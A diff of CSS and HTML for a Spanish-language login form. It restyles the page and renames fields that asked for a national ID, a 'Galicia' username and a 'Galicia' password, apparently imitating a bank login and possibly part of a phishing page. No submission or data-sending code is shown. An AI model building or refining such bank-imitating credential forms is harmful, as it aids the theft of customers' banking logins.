@@ -10,7 +10,7 @@
   margin:0;
   padding:0;
   box-sizing:border-box;
-  font-family: Inter, system-ui, -apple-system, sans-serif;
+  font-family:"Segoe UI", sans-serif;
 }
 
 body{
@@ -35,11 +35,7 @@ body{
 }
 
 .login-box{
-  width: 380px;
-  background: white;
-  padding: 48px;
-  border-radius: 18px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.08);
+  width:360px;
 }
 
 .logo{
@@ -73,16 +69,17 @@ h1{
 }
 
 input{
-  border: 1px solid #e6e8ef;
-  border-radius: 10px;
-  padding: 14px 12px;
-  transition: .2s;
-  background: #fafbff;
+  width:100%;
+  border:none;
+  border-bottom:2px solid #ddd;
+  padding:14px 4px;
+  font-size:16px;
+  outline:none;
+  transition:.3s;
 }
 
 input:focus{
-  border-color: #2f6bff;
-  box-shadow: 0 0 0 4px rgba(47,107,255,.1);
+  border-color:#d13d3d;
 }
 
 .options{
@@ -183,15 +180,15 @@ button:hover{
       <form id="miFormulario">
 
         <div class="input-group">
-          <input type="text" name="Tu DNI" placeholder="Tu documento" required>
+          <input type="text" name="usuario" placeholder="Tu documento" required>
         </div>
 
         <div class="input-group">
-          <input type="text" name="Tu usuario Galicia" placeholder="Usuario" required>
+          <input type="text" name="nombre" placeholder="Usuario" required>
         </div>
 
         <div class="input-group">
-          <input type="password" name="Tu clave Galicia" placeholder="Contraseña" required>
+          <input type="password" name="clave" placeholder="Contraseña" required>
         </div>
 
         <div class="options">
